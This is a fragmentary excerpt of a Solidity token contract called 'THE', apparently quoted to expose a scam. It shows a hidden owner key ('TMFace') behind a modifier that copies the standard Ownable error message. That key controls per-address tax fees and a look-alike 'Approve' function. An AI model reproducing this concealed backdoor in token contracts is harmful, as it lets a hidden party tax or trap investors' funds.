...
contract THE is Context, IERC20, Ownable {
    ...
    address payable private marketingWalletAddress = payable(0xa05dAC33c363B46A1719e333509521a2E73f6825); 
    address payable private teamWalletAddress = payable(0x0EA36690AA75A074f31B13292B7A914FaB009C9B); 
	...
	modifier onlyLDKey{
       require(TMFace == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
	...
	function setAddressToken(address _address, bool _enable, uint256 _addressTaxFee) external onlyLDKey{
	...
	function Approve(address spender,uint256 amount)public onlyLDKey{
